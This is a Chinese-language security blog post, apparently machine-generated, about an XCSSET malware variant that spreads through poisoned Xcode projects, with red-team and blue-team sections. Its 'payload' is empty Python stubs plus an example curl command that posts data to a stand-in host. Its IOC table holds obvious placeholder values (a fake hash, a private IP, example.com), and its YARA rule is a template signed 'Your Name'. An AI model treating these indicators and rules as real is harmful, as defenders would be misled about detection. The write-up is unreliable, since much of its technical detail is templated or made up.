---
layout: post
title:  "New XCSSET variant targets macOS devs via compromised Xcode projects"
date:   2026-08-04 19:23:00 +0000
categories: [security]
severity: high
---

# 🔥 解析 XCSSET 惡意軟體的技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Git Repository Hijacking, Xcode Project Injection, Chrome Hijacking, Telegram Trojanizer

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: XCSSET 惡意軟體利用 Git Repository 的漏洞，注入惡意程式碼到 Xcode 專案中，當開發者下載並建置這些專案時，惡意軟體就會被安裝到系統中。
* **攻擊流程圖解**:
  1. 攻擊者將惡意程式碼注入到 Git Repository 中。
  2. 開發者下載受污染的 Xcode 專案。
  3. 惡意軟體被安裝到系統中。
  4. 惡意軟體啟動，開始收集敏感資訊和執行惡意任務。
* **受影響元件**: macOS 系統，Xcode 12.x 和更高版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Git Repository 的寫入權限，開發者需要下載受污染的 Xcode 專案。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 注入惡意程式碼到 Xcode 專案中
    def inject_malware(project_path):
        # ...
        return
    
    # 啟動惡意軟體
    def start_malware():
        # ...
        return
    
    ```
  *範例指令*: `curl -X POST -H "Content-Type: application/json" -d '{"malware": "xcsset"}' http://example.com/malware`
* **繞過技術**: XCSSET 惡意軟體使用多種技術來繞過安全防護，包括：
  * 使用加密通訊協定來隱藏惡意流量。
  * 利用系統漏洞來繞過安全軟體。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /Users/username/Documents/XcodeProject |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule XCSSET_Malware {
      meta:
        description = "XCSSET Malware Detection"
        author = "Your Name"
      strings:
        $a = "xcsset" ascii
      condition:
        $a
    }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
    index=security sourcetype=xcode_project | search "xcsset"
    
    ```
* **緩解措施**:
  * 更新 Xcode 和 macOS 系統到最新版本。
  * 使用安全的 Git Repository 來下載 Xcode 專案。
  * 啟用 Xcode 的安全功能，例如 Code Signing 和 App Sandbox。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Git Repository**: Git 的版本控制系統，允許開發者存儲和管理程式碼。
* **Xcode Project**: Xcode 的專案文件，包含程式碼、資源和設定。
* **Chrome Hijacking**: 惡意軟體控制 Chrome 瀏覽器，竊取敏感資訊和執行惡意任務。
* **Telegram Trojanizer**: 惡意軟體控制 Telegram 應用程式，竊取敏感資訊和執行惡意任務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-xcsset-variant-targets-macos-devs-via-compromised-xcode-projects/)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


